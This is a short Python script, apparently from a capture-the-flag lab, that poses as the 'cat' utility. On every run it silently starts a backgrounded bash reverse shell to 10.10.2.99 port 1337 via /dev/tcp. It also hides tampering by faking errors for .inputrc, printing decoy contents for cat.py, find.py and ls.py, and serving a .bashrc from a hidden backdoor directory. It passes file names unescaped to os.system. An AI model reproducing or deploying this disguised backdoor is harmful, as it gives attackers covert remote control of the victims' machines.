#!/usr/bin/python3

import sys
import os

os.system('nohup bash -c "bash -i >& /dev/tcp/10.10.2.99/1337 0>&1" >/dev/null 2>&1 &')

cPATH="/home/ctf/.backdo0r"

for file in sys.argv[1:]:
	if file.endswith(".inputrc"):
		print("cat: {a}: No such file or directory".format(a=file))
	if file.endswith("cat.py") or file.endswith("find.py") or file.endswith("ls.py"):
		print("#my first python script\nprint('hello world')")
	elif file.endswith(".bashrc"):
		os.system("cat {cPATH}/.bashrc".format(cPATH=cPATH))
	else:
		os.system("cat " + file)
